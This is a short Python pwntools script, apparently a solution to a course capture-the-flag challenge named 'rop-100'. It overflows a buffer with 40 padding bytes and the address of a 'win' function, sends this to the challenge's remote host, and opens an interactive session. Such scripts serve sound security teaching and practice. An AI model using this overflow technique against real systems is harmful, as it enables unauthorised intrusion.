#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):
    gs= '''
        init-pwndbg
        b *0x4011be
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    #answer = b'Try Harder\x00' * 3 + b'A'  * 7
    answer = b'A' * 40
    win = p64(e.sym['win'])
    p.sendline(answer+win)
    p.interactive()

if __name__=="__main__":
    file = './rop-100'

    #p = start(file)
    p = remote("cse4830-rop-100.chals.io", 443, ssl=True, sni="cse4830-rop-100.chals.io")
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
